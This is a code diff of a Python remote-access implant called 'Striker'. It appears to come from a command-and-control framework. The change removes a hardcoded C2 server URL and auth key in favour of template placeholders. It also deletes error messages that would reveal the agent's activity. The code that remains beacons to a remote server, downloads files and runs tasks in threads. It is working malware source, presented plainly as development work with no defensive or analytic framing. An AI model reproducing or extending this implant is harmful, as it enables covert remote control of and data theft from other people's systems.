@@ -1,5 +1,3 @@
-#!/usr/bin/python3
-
 import sys
 import os
 import subprocess
@@ -11,15 +9,11 @@ import threading
 import urllib3
 import socket
 
-c2URL = "https://striker-api.debian.local"
-authKey = "345c8856fc611d5e3074385404550268"
-delay = 5
-MAX_FAILED_CONNS = 5
-
 class Striker:
 
   def __init__(self, servers, authKey, delay):
     self.abort = False
+    self.MAX_FAILED_CONNS = 5
     self.servers = servers
     self.authKey = authKey
     self.delay = int(delay)
@@ -53,7 +47,6 @@ class Striker:
       res = br.request('GET', url)
       return (res.status, res.data.decode('utf-8'))
     except Exception as e:
-      print("[-] Error making GET request to %s: %s" %(url, str(e)))
       return (0, str(e))
 
   def httpPost(self, url, body):
@@ -62,7 +55,6 @@ class Striker:
       res = br.request('POST', url, body=json.dumps(body).encode('utf-8'), headers={'Content-Type': 'application/json'})
       return (res.status, res.data.decode('utf-8'))
     except Exception as e:
-      print("[-] Error making POST request to %s: %s" %(url, str(e)))
       return (0, str(e))
 
   def httpDownload(self, url, filename):
@@ -235,7 +227,7 @@ class Striker:
     self.connectToBase();
     failedConns = 0
     while True:
-      if failedConns >= MAX_FAILED_CONNS:
+      if failedConns >= self.MAX_FAILED_CONNS:
         self.connectToBase()
         failedConns = 0
         continue
@@ -270,9 +262,8 @@ class Striker:
         t.start()
     return
 
-if __name__ == '__main__':
-  striker = Striker([c2URL], authKey, delay)
-  try:
-    striker.start()
-  except KeyboardInterrupt:
-    sys.exit(0)
+striker = Striker(["[STRIKER_URL]"], "[STRIKER_AUTH_KEY]", [STRIKER_DELAY])
+try:
+  striker.start()
+except KeyboardInterrupt:
+  sys.exit(0)
